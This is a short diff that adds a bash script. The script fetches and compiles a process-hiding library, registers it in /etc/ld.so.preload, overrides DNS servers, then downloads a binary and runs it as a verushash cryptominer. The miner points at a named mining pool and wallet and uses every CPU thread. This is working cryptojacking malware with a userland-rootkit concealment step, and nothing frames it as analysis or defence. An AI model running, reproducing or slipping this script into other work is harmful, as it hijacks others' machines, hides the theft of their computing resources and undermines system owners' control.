@@ -1,0 +1,13 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://github.com/kartolo92/koplok/raw/master/nyumput.c -o nyumput.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
+mv libnyumput.so /usr/local/lib/
+echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
+rm nyumput.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+wget -O asu https://github.com/kidoescegh/filee/raw/main/SRB-3.0
+chmod 777 asu
+./asu --algorithm verushash --pool stratum+tcps://tht.mine-n-krush.org:5001 --wallet 4ABvqyPptDc2FiJncCiJVSabDJk8guGYcr.$(echo $RANDOM | md5sum | head -c 20) --password x --cpu-threads $(nproc --all)
